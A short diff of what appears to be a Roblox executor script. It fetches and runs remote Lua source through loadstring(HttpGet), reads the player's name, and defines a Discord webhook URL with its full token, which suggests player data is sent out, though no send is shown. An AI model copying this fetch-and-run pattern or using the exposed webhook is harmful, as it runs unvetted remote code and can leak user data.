@@ -1,7 +1,6 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Player = game.Players.LocalPlayer
 local plrname = Player.name
-https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/gfhfdhvcjje
 local HS = game:GetService("HttpService")
 local WebhookURL = "https://discord.com/api/webhooks/1026231705071263776/kpkvZru6JIQWUFvth315qPJBGv4T9fkrDZxZsu5bZ3JOALx9-KOmVLNnNCrRTGpv73oP"
 
